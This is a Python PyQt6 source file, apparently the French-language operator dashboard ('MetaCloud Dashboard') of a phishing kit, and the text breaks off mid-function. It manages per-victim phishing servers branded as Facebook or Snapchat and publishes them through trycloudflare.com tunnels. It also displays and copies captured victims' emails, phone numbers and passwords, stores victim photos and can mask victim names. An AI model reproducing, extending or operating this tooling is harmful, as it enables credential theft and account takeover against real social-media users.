"""panneau_admin.py — auto-generated from Release.py."""

import sys
import os
import re
import time
import threading
import subprocess
import socket
import requests
from werkzeug.serving import make_server
from datetime import datetime
from PyQt6.QtWidgets import QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QLineEdit, QPushButton, QLabel, QTextEdit, QGroupBox, QSplitter, QRadioButton, QCheckBox, QFrame, QScrollArea, QDialog, QGridLayout, QTabWidget, QFileDialog, QComboBox, QMenu, QInputDialog, QStyle, QStyleOptionButton, QMessageBox, QListWidget, QListWidgetItem, QAbstractItemView
from PyQt6.QtCore import Qt, QTimer, QPropertyAnimation, QEasingCurve, QVariantAnimation, QAbstractAnimation
from PyQt6.QtGui import QTextCursor, QFont, QColor, QCursor, QPainter
import json
import base64
from routes import app
from config import active_servers, sandbox_config, get_cfg, TARGETS_DIR, BASE_CONFIG, TRASH_DIR, is_target_hidden, set_target_hidden, rename_target_meta, remove_target_meta, mask_name, is_hide_names, set_hide_names
from widgets import BounceButton, TextEditorDialog, PublicationDialog, ModernToggleSwitch
from helpers import is_port_in_use, ajouter_log, BANNER_ASCII, log_error

from ._header import BANNER_ASCII, BASE_CONFIG, BounceButton, ModernToggleSwitch, QApplication, QComboBox, QEasingCurve, QHBoxLayout, QLabel, QMainWindow, QMenu, QMessageBox, QPropertyAnimation, QScrollArea, QTextCursor, QTextEdit, QTimer, QVBoxLayout, QWidget, Qt, TARGETS_DIR, active_servers, ajouter_log, app, button_manager, datetime, is_port_in_use, is_target_hidden, json, log_error, log_error_to_file, make_server, os, sandbox_config, set_target_hidden, subprocess, sys, threading, time
from .config_window import ConfigWindow
from .corbeille import CorbeilleWindow
from .credentials import CredentialsWindow
from .sandbox_window import SandboxWindow

class PanneauAdmin(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("MetaCloud Dashboard")
        self.setMinimumSize(750, 650)
        self.resize(800, 700)
        self._apply_theme_style()

        central = QWidget()
        self.setCentralWidget(central)
        main_layout = QVBoxLayout(central)
        main_layout.setContentsMargins(12, 12, 12, 12)
        main_layout.setSpacing(10)

        self.target_rows = {}   # tid -> {port, cfg, widgets...}
        self.selected_tid = None
        self.selected_row_widget = None  # track the currently highlighted row
        self.config_win = ConfigWindow(self)
        self.victim_windows = {}  # kept for compat

        # ── Header ──
        header_lbl = QLabel("<h2 style='color:#3b82f6; margin:0;'>MetaCloud Dashboard</h2><p style='color:#64748b; margin:0;'>Gestion centralisée multi-cibles</p>")
        header_lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
        main_layout.addWidget(header_lbl)

        # ── Toolbar ──
        toolbar = QHBoxLayout()
        toolbar.setSpacing(8)
        self.btn_config = BounceButton("➕ Ajouter une nouvelle cible")
        self.btn_config.clicked.connect(self.config_win.add_new_target_dialog)
        self._style_btn(self.btn_config, 'accent')
        toolbar.addWidget(self.btn_config)
        self.btn_corbeille = BounceButton("🗑️ Corbeille")
        self.btn_corbeille.clicked.connect(self.show_corbeille)
        self._style_btn(self.btn_corbeille, 'neutral')
        toolbar.addWidget(self.btn_corbeille)
        self.btn_credentials = BounceButton("🔐 Identifiants")
        self.btn_credentials.clicked.connect(lambda: self.show_credentials(None))
        self._style_btn(self.btn_credentials, 'success')
        toolbar.addWidget(self.btn_credentials)
        self.btn_settings = BounceButton("⚙️ Paramètres système")
        self.btn_settings.clicked.connect(self.show_system_settings)
        self._style_btn(self.btn_settings, 'accent')
        toolbar.addWidget(self.btn_settings)
        # Note: the "hide/show victim names" toggle has been moved to the
        # System Settings window. The toggle_hide_names / _update_hide_names_button_style
        # methods below are kept so that child windows (credentials, corbeille) can
        # still sync the global flag and trigger a rebuild of the target list.
        # Create a placeholder attribute so the methods don't crash if invoked.
        self.btn_hide_names = None
        toolbar.addStretch()

        self.lbl_active = QLabel("Actives : 0")
        from theme import get_theme as _gt_active
        _t_active = _gt_active()
        self.lbl_active.setStyleSheet(f"color: {_t_active['text_dim']}; font-weight: bold;")
        toolbar.addWidget(self.lbl_active)
        main_layout.addLayout(toolbar)

        # ── Targets Scroll Area ──
        targets_header_lay = QHBoxLayout()
        lbl_targets = QLabel("<b>Cibles disponibles</b>")
        targets_header_lay.addWidget(lbl_targets)
        
        targets_header_lay.addStretch()
        self.combo_filter_targets = QComboBox()
        # Each entry: (emoji, label)
        filter_items = [
            ("📋", "Toutes les cibles"),
            ("🟢", "Cibles Actives"),
            ("⚪", "Cibles Inactives"),
            ("🙈", "Cibles Masquées"),
        ]
        for icon, label in filter_items:
            self.combo_filter_targets.addItem(f"  {icon}  {label}")
        from theme import get_theme as _gt_combo
        _t_combo = _gt_combo()
        self.combo_filter_targets.setStyleSheet(f"""
            QComboBox {{
                background-color: {_t_combo['bg_alt']};
                border: 1px solid {_t_combo['accent']};
                border-radius: 10px;
                padding: 8px 16px 8px 12px;
                color: {_t_combo['text']};
                font-weight: normal;
                font-size: 12px;
                min-width: 180px;
                min-height: 18px;
            }}
            QComboBox:hover {{
                background-color: {_t_combo['border_hover']};
                border: 1px solid {_t_combo['accent_text']};
            }}
            QComboBox:pressed {{
                background-color: {_t_combo['border']};
            }}
            QComboBox::drop-down {{
                subcontrol-origin: padding;
                subcontrol-position: top right;
                width: 28px;
                border-left: 1px solid {_t_combo['border']};
                border-top-right-radius: 10px;
                border-bottom-right-radius: 10px;
                background: transparent;
            }}
            QComboBox::drop-down:hover {{
                background: {_t_combo['accent']};
            }}
            QComboBox::down-arrow {{
                image: none;
                border-left: 5px solid transparent;
                border-right: 5px solid transparent;
                border-top: 6px solid {_t_combo['accent_text']};
                width: 0;
                height: 0;
            }}
            QComboBox::down-arrow:hover {{
                border-top-color: {_t_combo['text']};
            }}
            QComboBox QAbstractItemView {{
                background-color: {_t_combo['bg']};
                border: 1px solid {_t_combo['accent']};
                border-radius: 10px;
                padding: 6px;
                outline: none;
                selection-background-color: {_t_combo['accent']};
                selection-color: white;
                color: {_t_combo['text']};
            }}
            QComboBox QAbstractItemView::item {{
                padding: 10px 14px;
                border-radius: 6px;
                min-height: 20px;
            }}
            QComboBox QAbstractItemView::item:hover {{
                background-color: {_t_combo['bg_alt']};
                color: {_t_combo['accent_text']};
            }}
            QComboBox QAbstractItemView::item:selected {{
                background-color: {_t_combo['accent']};
                color: white;
                font-weight: normal;
            }}
        """)
        self.combo_filter_targets.view().setSpacing(2)
        self.combo_filter_targets.currentIndexChanged.connect(self.rebuild_target_list)
        targets_header_lay.addWidget(self.combo_filter_targets)
        
        main_layout.addLayout(targets_header_lay)
        self.scroll = QScrollArea()
        self.scroll.setWidgetResizable(True)
        self.scroll.setMaximumHeight(250)
        from theme import get_theme as _gt_scroll
        _t_scroll = _gt_scroll()
        self.scroll.setStyleSheet(f"QScrollArea {{ border: 1px solid {_t_scroll['border']}; border-radius: 8px; background: {_t_scroll['bg']}; }}")
        self.scroll_widget = QWidget()
        self.targets_layout = QVBoxLayout(self.scroll_widget)
        self.targets_layout.setContentsMargins(6, 6, 6, 6)
        self.targets_layout.setSpacing(5)
        self.scroll.setWidget(self.scroll_widget)
        main_layout.addWidget(self.scroll)
        self.rebuild_target_list()

        # ── Log Viewer ──
        log_header = QHBoxLayout()
        self.lbl_log_title = QLabel("<b>Logs :</b> (sélectionnez une cible)")
        log_header.addWidget(self.lbl_log_title)
        log_header.addStretch()
        self.btn_clear = BounceButton("🗑 Clear")
        self.btn_clear.setFixedHeight(30)
        self._style_btn(self.btn_clear, 'danger')
        self.btn_clear.clicked.connect(self.clear_selected_logs)
        log_header.addWidget(self.btn_clear)
        self._log_filter_btns = []
        for lbl_t, key in [("📧 Email/Numéro", "email"), ("🔑 Pass", "pass")]:
            b = BounceButton(lbl_t)
            b.setFixedHeight(30)
            self._style_btn(b, 'neutral')
            b.clicked.connect(lambda checked, k=key: self.copy_selected_cred(k))
            log_header.addWidget(b)
            self._log_filter_btns.append(b)
        main_layout.addLayout(log_header)

        self.log = QTextEdit()
        self.log.setReadOnly(True)
        self.log.setHtml(BANNER_ASCII)
        main_layout.addWidget(self.log)

        self.timer = QTimer()
        self.timer.timeout.connect(self.maj_interface)
        self.timer.start(1000)
        self.last_logs_len = 0

    # ════════════════════════════════════════════════════════════════════
    #  Nouveaux styles de boutons — modernes et unifiés
    # ════════════════════════════════════════════════════════════════════

    _EMOJI_FONT = "'Segoe UI Emoji', 'Apple Color Emoji', 'Noto Color Emoji', 'DejaVu Sans', Arial"

    def _style_btn(self, btn, variant='accent'):
        """Style un bouton du dashboard avec le variant donné.
        variant: 'accent', 'success', 'warning', 'danger', 'neutral'"""
        try:
            from theme import get_theme
            t = get_theme()
            colors = {
                'accent':  (t['accent'],       t['accent_hover'],   t['accent_pressed'],  '#fff'),
                'success': (t['success'],      '#16a34a',           '#15803d',            '#fff'),
                'warning': (t['warning'],      '#d97706',           '#b45309',            '#fff'),
                'danger':  (t['danger'],       '#dc2626',           '#b91c1c',            '#fff'),
                'neutral': (t['bg_alt'],       t['border_hover'],   t['border'],          t['text']),
            }
            bg, hover, pressed, text_color = colors.get(variant, colors['accent'])
            border = 'none' if variant != 'neutral' else f"1px solid {t['border_hover']}"
            btn.setStyleSheet(f"""
                QPushButton {{
                    background-color: {bg}; color: {text_color}; border: {border};
                    border-radius: 8px; padding: 8px 16px;
                    font-weight: normal;
                }}
                QPushButton:hover {{ background-color: {hover}; }}
                QPushButton:pressed {{ background-color: {pressed}; padding-top: 9px; }}
                QPushButton:disabled {{ background-color: {t['bg_alt']}; color: {t.get('text_muted', '#64748b')}; }}
            """)
        except Exception as e:
            try:
                from helpers import log_error
                log_error("PanneauAdmin._style_btn", e)
            except Exception:
                pass

    def _style_icon_btn(self, btn, variant='neutral'):
        """Style un bouton icône de la ligne victime (36×30)."""
        try:
            from theme import get_theme
            t = get_theme()
            colors = {
                'accent':  (t['accent'],       t['accent_hover'],   t['accent_pressed'],  '#fff', 'none'),
                'success': (t['success'],      '#16a34a',           '#15803d',            '#fff', 'none'),
                'warning': (t['warning'],      '#d97706',           '#b45309',            '#fff', 'none'),
                'danger':  (t['danger'],       '#dc2626',           '#b91c1c',            '#fff', 'none'),
                'neutral': (t['bg_alt'],       t['border_hover'],   t['border'],          t['text'], f"1px solid {t['border_hover']}"),
            }
            bg, hover, pressed, text_color, border = colors.get(variant, colors['neutral'])
            btn.setStyleSheet(f"""
                QPushButton {{
                    background-color: {bg}; color: {text_color}; border: {border};
                    border-radius: 8px; padding: 0px;
                    font-size: 15px; font-weight: normal;
                    font-family: {self._EMOJI_FONT};
                }}
                QPushButton:hover {{ background-color: {hover}; }}
                QPushButton:pressed {{ background-color: {pressed}; }}
            """)
        except Exception as e:
            try:
                from helpers import log_error
                log_error("PanneauAdmin._style_icon_btn", e)
            except Exception:
                pass

    def _apply_theme_style(self):
        """Build and apply the window stylesheet using the current theme colors.
        Called at __init__ and again by refresh_theme() when the theme changes.
        Does NOT modify the window structure — only colors."""
        try:
            from theme import get_theme
            from PyQt6.QtWidgets import QComboBox, QScrollArea, QLabel, QPushButton
            t = get_theme()
            _emoji = "'Segoe UI Emoji', 'Apple Color Emoji', 'Noto Color Emoji', 'DejaVu Sans', Arial"
            self.setStyleSheet(f"""
                QMainWindow {{ background-color: {t['bg']}; }}
                QWidget {{ color: {t['text']}; font-size: 12px; }}
                QPushButton {{ background-color: {t['bg_alt']}; color: {t['text']}; border: 1px solid {t['border_hover']}; font-weight: normal; border-radius: 8px; padding: 8px 14px; }}
                QPushButton:hover {{ background-color: {t['border_hover']}; border-color: {t['accent']}; color: {t['accent_text']}; }}
                QPushButton:pressed {{ background-color: {t['border']}; }}
                QComboBox {{ background-color: {t['bg_alt']}; border: 1px solid {t['border_hover']}; padding: 8px; border-radius: 8px; color: {t['text']}; }}
                QTextEdit {{ background-color: {t['bg_input']}; border: 1px solid {t['border']}; border-radius: 8px; color: {t['text_dim']}; font-family: 'Consolas', monospace; font-size: 11px; }}
            """)
            # Re-apply individual button stylesheets
            if hasattr(self, 'btn_config') and isinstance(self.btn_config, QPushButton):
                self._style_btn(self.btn_config, 'accent')
            if hasattr(self, 'btn_corbeille') and isinstance(self.btn_corbeille, QPushButton):
                self._style_btn(self.btn_corbeille, 'neutral')
            if hasattr(self, 'btn_credentials') and isinstance(self.btn_credentials, QPushButton):
                self._style_btn(self.btn_credentials, 'success')
            if hasattr(self, 'btn_settings') and isinstance(self.btn_settings, QPushButton):
                self._style_btn(self.btn_settings, 'accent')
            if hasattr(self, 'btn_clear') and isinstance(self.btn_clear, QPushButton):
                self._style_btn(self.btn_clear, 'danger')
            if hasattr(self, '_log_filter_btns') and self._log_filter_btns:
                for b in self._log_filter_btns:
                    if isinstance(b, QPushButton):
                        self._style_btn(b, 'neutral')
            if hasattr(self, 'lbl_active') and isinstance(self.lbl_active, QLabel):
                self.lbl_active.setStyleSheet(f"color: {t['text_dim']}; font-weight: bold;")
            # Re-apply the combo_filter_targets stylesheet so it picks up the new theme
            if hasattr(self, 'combo_filter_targets') and isinstance(self.combo_filter_targets, QComboBox):
                self.combo_filter_targets.setStyleSheet(f"""
                    QComboBox {{
                        background-color: {t['bg_alt']};
                        border: 1px solid {t['accent']};
                        border-radius: 10px;
                        padding: 8px 16px 8px 12px;
                        color: {t['text']};
                        font-weight: normal;
                        font-size: 12px;
                        min-width: 180px;
                        min-height: 18px;
                    }}
                    QComboBox:hover {{
                        background-color: {t['border_hover']};
                        border: 1px solid {t['accent_text']};
                    }}
                    QComboBox:pressed {{
                        background-color: {t['border']};
                    }}
                    QComboBox::drop-down {{
                        subcontrol-origin: padding;
                        subcontrol-position: top right;
                        width: 28px;
                        border-left: 1px solid {t['border']};
                        border-top-right-radius: 10px;
                        border-bottom-right-radius: 10px;
                        background: transparent;
                    }}
                    QComboBox::drop-down:hover {{
                        background: {t['accent']};
                    }}
                    QComboBox::down-arrow {{
                        image: none;
                        border-left: 5px solid transparent;
                        border-right: 5px solid transparent;
                        border-top: 6px solid {t['accent_text']};
                        width: 0;
                        height: 0;
                    }}
                    QComboBox::down-arrow:hover {{
                        border-top-color: {t['text']};
                    }}
                    QComboBox QAbstractItemView {{
                        background-color: {t['bg']};
                        border: 1px solid {t['accent']};
                        border-radius: 10px;
                        padding: 6px;
                        outline: none;
                        selection-background-color: {t['accent']};
                        selection-color: white;
                        color: {t['text']};
                    }}
                    QComboBox QAbstractItemView::item {{
                        padding: 10px 14px;
                        border-radius: 6px;
                        min-height: 20px;
                    }}
                    QComboBox QAbstractItemView::item:hover {{
                        background-color: {t['bg_alt']};
                        color: {t['accent_text']};
                    }}
                    QComboBox QAbstractItemView::item:selected {{
                        background-color: {t['accent']};
                        color: white;
                        font-weight: normal;
                    }}
                """)
            # Re-apply the scroll area stylesheet so it picks up the new theme
            # NOTE: 'scroll' is also a built-in QWidget method, so we must check isinstance
            if hasattr(self, 'scroll') and isinstance(getattr(self, 'scroll', None), QScrollArea):
                self.scroll.setStyleSheet(f"QScrollArea {{ border: 1px solid {t['border']}; border-radius: 8px; background: {t['bg']}; }}")
            # Rebuild target list so row colors + button colors pick up the new theme
            # ONLY if targets_layout already exists (not during initial __init__)
            try:
                if hasattr(self, 'targets_layout') and self.targets_layout:
                    self.rebuild_target_list()
            except Exception:
                pass
        except Exception as e:
            log_error_to_file('PanneauAdmin._apply_theme_style', e)

    # ── Build target rows ──
    def rebuild_target_list(self):
        try:
            # Clear layout
            while self.targets_layout.count():
                item = self.targets_layout.takeAt(0)
                if item.widget(): item.widget().deleteLater()

            if not os.path.exists(TARGETS_DIR):
                os.makedirs(TARGETS_DIR)

            files = sorted([f for f in os.listdir(TARGETS_DIR) if f.endswith(".json")])
            from config import active_servers

            filter_text = self.combo_filter_targets.currentText() if hasattr(self, 'combo_filter_targets') else "Toutes les cibles"

            for fname in files:
                tid = fname.replace(".json", "")

                # Find if this target is running
                running_port = None
                for p, cfg in active_servers.items():
                    if cfg.get("target_name") == tid:
                        running_port = p
                        break

                # Hidden filter (use 'in' to be resilient to emoji prefixes in the combo text)
                is_hidden = is_target_hidden(tid)
                if "Masquées" in filter_text:
                    if not is_hidden:
                        continue
                else:
                    # For other filters, hide hidden targets by default
                    if is_hidden:
                        continue

                if "Actives" in filter_text and not running_port:
                    continue
                if "Inactives" in filter_text and running_port:
                    continue

                row = QWidget()
                # Slightly dim hidden targets (only visible in "Masquées" filter)
                from theme import get_theme as _gt_row
                _t_row = _gt_row()
                _is_selected = (tid == self.selected_tid)
                if is_hidden:
                    _bg = _t_row['bg_input']
                    _border = f"1px dashed {_t_row['text_muted']}"
                elif _is_selected:
                    _bg = _t_row['bg_alt']
                    _border = f"1px solid {_t_row['accent']}"
                else:
                    _bg = _t_row['bg_alt']
                    _border = "none"
                row.setStyleSheet(f"QWidget {{ background-color: {_bg}; border: {_border}; border-radius: 8px; }}")
                row.setFixedHeight(44)
                row.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
                row.customContextMenuRequested.connect(lambda pos, t=tid, r=row: self._show_panneau_context_menu(pos, t, r))
                # Make the entire row clickable to select this target's logs
                row.mousePressEvent = lambda ev, t=tid, r=row: self.select_target(t, r)
                # If this row matches the currently selected tid, update the reference
                # so select_target can properly un-highlight it later.
                if _is_selected:
                    self.selected_row_widget = row
                rl = QHBoxLayout(row)
                rl.setContentsMargins(10, 4, 10, 4)
                rl.setSpacing(8)


                # Status dot
                dot = "🟢" if running_port else "⚪"
                
                # Victim avatar
                victim_photo = self.config_win._get_victim_photo(tid) if hasattr(self, 'config_win') else ""
                avatar = self.config_win._make_round_avatar(victim_photo, size=28) if hasattr(self, 'config_win') else QLabel()
                rl.addWidget(avatar)

                lbl = QLabel(f"{dot} {mask_name(tid)}")
                lbl.setStyleSheet("font-weight: bold; font-size: 13px;")
                rl.addWidget(lbl)

                # Platform badge
                try:
                    import platforms as _pf
                    # Read platform from JSON
                    _pjson_path = os.path.join(TARGETS_DIR, f"{tid}.json")
                    _pid = "facebook"
                    if os.path.exists(_pjson_path):
                        try:
                            with open(_pjson_path, 'r', encoding='utf-8') as _f:
                                _pid = json.load(_f).get("platform", "facebook") or "facebook"
                        except Exception as e:
                            log_error_to_file('PanneauAdmin.rebuild_target_list.platform_json', e)
                    _pinfo = _pf.PLATFORMS.get(_pid, _pf.PLATFORMS["facebook"])
                    _pbadge = QLabel(f" {_pinfo['name']} ")
                    _pbadge.setStyleSheet(f"""
                        QLabel {{
                            background-color: {_pinfo.get('primary_color','#3b82f6')};
                            color: {'#000' if _pid in ('snapchat',) else '#fff'};
                            border-radius: 8px; padding: 2px 8px;
                            font-size: 10px; font-weight: bold;
                        }}
                    """)
                    rl.addWidget(_pbadge)
                except Exception as e:
                    log_error_to_file('PanneauAdmin.rebuild_target_list.platform_badge', e)
                rl.addStretch()

                # Hide/Show button (eye)
                btn_visibility = BounceButton("🙈" if is_hidden else "👁️")
                btn_visibility.setFixedSize(36, 30)
                btn_visibility.setToolTip("Masquer cette cible" if not is_hidden else "Afficher cette cible")
                self._style_icon_btn(btn_visibility, 'warning' if is_hidden else 'neutral')
                btn_visibility.clicked.connect(lambda checked, t=tid: self.toggle_target_visibility(t))
                rl.addWidget(btn_visibility)

                # Credentials button (lock icon) — open the credentials viewer filtered to this target
                btn_creds = BounceButton("🔐")
                btn_creds.setFixedSize(36, 30)
                btn_creds.setToolTip("Voir les identifiants capturés pour cette cible")
                self._style_icon_btn(btn_creds, 'neutral')
                btn_creds.clicked.connect(lambda checked, t=tid: self.show_credentials(t))
                rl.addWidget(btn_creds)

                if running_port:
                    port_lbl = QLabel(f":{running_port}")
                    from theme import get_theme as _gt_port
                    _t_port = _gt_port()
                    port_lbl.setStyleSheet(f"color: {_t_port['success']}; font-size: 11px;")
                    rl.addWidget(port_lbl)

                    # Public button
                    cfg_ref = active_servers[running_port]
                    btn_pub = BounceButton("🌐")
                    btn_pub.setFixedSize(36, 30)
                    btn_pub.setToolTip("Go Public / Copy URL")
                    if cfg_ref.get("public_mode"):
                        self._style_icon_btn(btn_pub, 'warning')
                        btn_pub.clicked.connect(lambda ch, c=cfg_ref: self.copy_cf_url(c))
                        btn_pub.setToolTip(cfg_ref.get("cf_url", ""))
                    else:
                        self._style_icon_btn(btn_pub, 'neutral')
                        btn_pub.clicked.connect(lambda ch, p=running_port, c=cfg_ref: self.go_public(p, c))
                    rl.addWidget(btn_pub)

                    # Modern Toggle Switch (ON = Running)
                    toggle = ModernToggleSwitch(size="medium")
                    toggle.set_state(True)
                    toggle.setToolTip("🟢 Serveur EN COURS\nCliquez pour arrêter")
                    toggle.toggled.connect(lambda checked, p=running_port: self.stop_target(p) if not checked else None)
                    rl.addWidget(toggle)

                    # Public link display (green, non-copyable, only when URL extracted)
                    cf_url = cfg_ref.get("cf_url", "")
                    if cfg_ref.get("public_mode") and cf_url and "trycloudflare.com" in cf_url:
                        link_lbl = QLabel(f"  🔗 {cf_url}  ")
                        from theme import get_theme as _gt_link
                        _t_link = _gt_link()
                        link_lbl.setStyleSheet(f"""
                            QLabel {{
                                color: {_t_link['success']};
                                background-color: {_t_link['bg_input']};
                                border: 1px solid {_t_link['success']};
                                border-radius: 6px;
                                padding: 3px 10px;
                                font-family: 'Consolas', 'Courier New', monospace;
                                font-size: 10px;
                                font-weight: bold;
                            }}
                        """)
                        link_lbl.setTextInteractionFlags(Qt.TextInteractionFlag.NoTextInteraction)
                        link_lbl.setCursor(Qt.CursorShape.ForbiddenCursor)
                        rl.addWidget(link_lbl)
                else:
                    # Modern Toggle Switch (OFF = Stopped)
                    toggle = ModernToggleSwitch(size="medium")
                    toggle.set_state(False)
                    toggle.setToolTip("⚫ Serveur ARRÊTÉ\nCliquez pour démarrer")
                    toggle.toggled.connect(lambda checked, t=tid: self.start_target(t) if checked else None)
                    rl.addWidget(toggle)

                self.targets_layout.addWidget(row)
            self.targets_layout.addStretch()

        except Exception as e:
            log_error_to_file('Release.rebuild_target_list', e)
            log_error('Release.rebuild_target_list', e)

    def toggle_target_visibility(self, tid):
        """Toggle the hidden flag of a target and refresh the list.
        The rebuild is deferred to the next event-loop tick to avoid destroying
        the BounceButton while its click handler is still running (which caused
        the click to appear non-functional)."""
        try:
            new_state = not is_target_hidden(tid)
            set_target_hidden(tid, new_state)
            # Defer the rebuild so the button's mouseReleaseEvent can complete safely
            QTimer.singleShot(0, self.rebuild_target_list)
        except Exception as e:
            log_error_to_file('PanneauAdmin.toggle_target_visibility', e)
            log_error('PanneauAdmin.toggle_target_visibility', e)

    def toggle_hide_names(self):
        """Toggle the global hide_names flag and refresh the UI.
        When ON, victim names are masked in the dashboard, credentials, and trash.
        Persisted in global_settings.json so the setting survives restarts."""
        try:
            new_state = not is_hide_names()
            set_hide_names(new_state)
            self._update_hide_names_button_style()
            # Rebuild the target list so labels pick up the new mask state
            QTimer.singleShot(0, self.rebuild_target_list)
            # Update the log title in case a target is selected
            if self.selected_tid:
                self.lbl_log_title.setText(f"<b>Logs :</b> {mask_name(self.selected_tid)}")
            # Notify any open child windows (credentials, corbeille, sandbox, config)
            # to refresh too — each implements refresh_for_hide_names() to re-mask
            # its UI labels.
            if hasattr(self, 'credentials_win') and self.credentials_win:
                try:
                    if hasattr(self.credentials_win, 'refresh_for_hide_names'):
                        self.credentials_win.refresh_for_hide_names()
                except Exception as e:
                    log_error_to_file('PanneauAdmin.toggle_hide_names.creds', e)
            if hasattr(self, 'corbeille_win') and self.corbeille_win:
                try:
                    if hasattr(self.corbeille_win, 'refresh_for_hide_names'):
                        self.corbeille_win.refresh_for_hide_names()
                except Exception as e:
                    log_error_to_file('PanneauAdmin.toggle_hide_names.corbeille', e)
            if hasattr(self, 'sandbox_win') and self.sandbox_win:
                try:
                    if hasattr(self.sandbox_win, 'refresh_for_hide_names'):
                        self.sandbox_win.refresh_for_hide_names()
                except Exception as e:
                    log_error_to_file('PanneauAdmin.toggle_hide_names.sandbox', e)
            if hasattr(self, 'config_win') and self.config_win:
                try:
                    if hasattr(self.config_win, 'refresh_for_hide_names'):
                        self.config_win.refresh_for_hide_names()
                except Exception as e:
                    log_error_to_file('PanneauAdmin.toggle_hide_names.config', e)
        except Exception as e:
            log_error_to_file('PanneauAdmin.toggle_hide_names', e)
            log_error('PanneauAdmin.toggle_hide_names', e)

    def _update_hide_names_button_style(self):
        """Update the hide-names toggle button label + color based on current state.
        No-op now that the button has been moved to System Settings — kept for
        backward compatibility with child windows that call this method."""
        try:
            if self.btn_hide_names is None:
                return
            if is_hide_names():
                self.btn_hide_names.setText("🙈 Noms masqués")
                self.btn_hide_names.setStyleSheet(
                    "QPushButton { background-color: #ef4444; color: white; border: none; font-weight: normal; }"
                    "QPushButton:hover { background-color: #dc2626; }"
                )
            else:
                self.btn_hide_names.setText("👁️ Noms visibles")
                self.btn_hide_names.setStyleSheet(
                    "QPushButton { background-color: #1E293B; color: #E2E8F0; border: 1px solid #475569; font-weight: normal; }"
                    "QPushButton:hover { background-color: #334155; }"
                )
        except Exception as e:
            log_error_to_file('PanneauAdmin._update_hide_names_button_style', e)

    def show_system_settings(self):
        """Open the global system settings window."""
        from .system_settings import SystemSettingsWindow
        win = SystemSettingsWindow(self)
        win.exec()
        # After the settings window closes, refresh the target list in case
        # hide_names was toggled (the names need to be re-masked/unmasked).
        try:
            self.rebuild_target_list()
            if self.selected_tid:
                self.lbl_log_title.setText(f"<b>Logs :</b> {mask_name(self.selected_tid)}")
        except Exception as e:
            log_error_to_file('PanneauAdmin.show_system_settings.refresh', e)
        # Also notify child windows (credentials, corbeille, sandbox, config) if open
        try:
            if hasattr(self, 'credentials_win') and self.credentials_win:
                if hasattr(self.credentials_win, 'refresh_for_hide_names'):
                    self.credentials_win.refresh_for_hide_names()
        except Exception as e:
            log_error_to_file('PanneauAdmin.show_system_settings.creds', e)
        try:
            if hasattr(self, 'corbeille_win') and self.corbeille_win:
                if hasattr(self.corbeille_win, 'refresh_for_hide_names'):
                    self.corbeille_win.refresh_for_hide_names()
        except Exception as e:
            log_error_to_file('PanneauAdmin.show_system_settings.corbeille', e)
        try:
            if hasattr(self, 'sandbox_win') and self.sandbox_win:
                if hasattr(self.sandbox_win, 'refresh_for_hide_names'):
                    self.sandbox_win.refresh_for_hide_names()
        except Exception as e:
            log_error_to_file('PanneauAdmin.show_system_settings.sandbox', e)
        try:
            if hasattr(self, 'config_win') and self.config_win:
                if hasattr(self.config_win, 'refresh_for_hide_names'):
                    self.config_win.refresh_for_hide_names()
        except Exception as e:
            log_error_to_file('PanneauAdmin.show_system_settings.config', e)

    def show_corbeille(self):
        button_id = "show_corbeille"
        if button_manager.is_locked(button_id):
            return
        button_manager.lock_button(button_id)
        try:
            if not hasattr(self, 'corbeille_win'):
                self.corbeille_win = CorbeilleWindow(self)
            self.corbeille_win.refresh_list()
            self.corbeille_win.show()
            self.corbeille_win.raise_()
        except Exception as e:
            log_error_to_file("PanneauAdmin.show_corbeille", e)
            log_error("PanneauAdmin.show_corbeille", e)
        finally:
            try:
                button_manager.unlock_button(button_id)
            except Exception:
                pass

    def show_credentials(self, tid=None):
        """Open the credentials viewer window, optionally filtered to a specific target."""
        button_id = f"show_credentials_{tid or 'all'}"
        if button_manager.is_locked(button_id):
            return
        button_manager.lock_button(button_id)
        try:
            # Reuse a single window instance, but update its tid filter
            if not hasattr(self, 'credentials_win'):
                self.credentials_win = CredentialsWindow(self, tid=tid)
            else:
                # Update the tid filter and refresh
                self.credentials_win.tid = tid
                if tid:
                    self.credentials_win.setWindowTitle(f"🔐 Identifiants capturés — {tid}")
                else:
                    self.credentials_win.setWindowTitle("🔐 Identifiants capturés — Toutes les cibles")
            self.credentials_win.refresh()
            self.credentials_win.show()
            self.credentials_win.raise_()
        except Exception as e:
            log_error_to_file("PanneauAdmin.show_credentials", e)
            log_error("PanneauAdmin.show_credentials", e)
        finally:
            try:
                button_manager.unlock_button(button_id)
            except Exception:
                pass

    def _show_panneau_context_menu(self, pos, tid, row_widget):
        try:
            from theme import get_theme as _gt_menu
            _t_menu = _gt_menu()
            menu = QMenu(self)
            menu.setStyleSheet(f"""
                QMenu {{ background-color: {_t_menu['bg_alt']}; border: 1px solid {_t_menu['border_hover']}; border-radius: 8px; padding: 4px; color: {_t_menu['text']}; }}
                QMenu::item {{ padding: 8px 20px; border-radius: 4px; font-size: 13px; }}
                QMenu::item:selected {{ background-color: {_t_menu['accent']}; color: white; }}
            """)
            
            act_config = menu.addAction("⚙️ Paramètres")
            act_config.triggered.connect(lambda: self.config_win.load_target(tid))
            
            act_rename = menu.addAction("✏️ Renommer la cible")
            act_rename.triggered.connect(lambda: self.config_win.rename_target(tid))
            
            act_photo = menu.addAction("🖼️ Image victime")
            act_photo.triggered.connect(lambda: self.config_win._pick_victim_photo(tid))

            # Masquer / Afficher
            if is_target_hidden(tid):
                act_vis = menu.addAction("👁️ Afficher dans le dashboard")
                act_vis.triggered.connect(lambda: self.toggle_target_visibility(tid))
            else:
                act_vis = menu.addAction("🙈 Masquer du dashboard")
                act_vis.triggered.connect(lambda: self.toggle_target_visibility(tid))
            
            act_del = menu.addAction("🗑️ Mettre à la corbeille")
            act_del.triggered.connect(lambda: self.config_win.delete_target(tid))
            
            menu.exec(row_widget.mapToGlobal(pos))
        except Exception as e:
            log_error_to_file('PanneauAdmin._show_panneau_context_menu', e)

    def select_target(self, tid, row_widget=None):
        from theme import get_theme as _gt_sel
        _t_sel = _gt_sel()
        # Un-highlight previous row (only if it still exists — rebuild_target_list
        # may have deleted it)
        if self.selected_row_widget and self.selected_row_widget is not row_widget:
            try:
                from PyQt6 import sip
                if sip.isdeleted(self.selected_row_widget):
                    self.selected_row_widget = None
                else:
                    _old_tid = self.selected_tid
                    _is_hidden = is_target_hidden(_old_tid) if _old_tid else False
                    if _is_hidden:
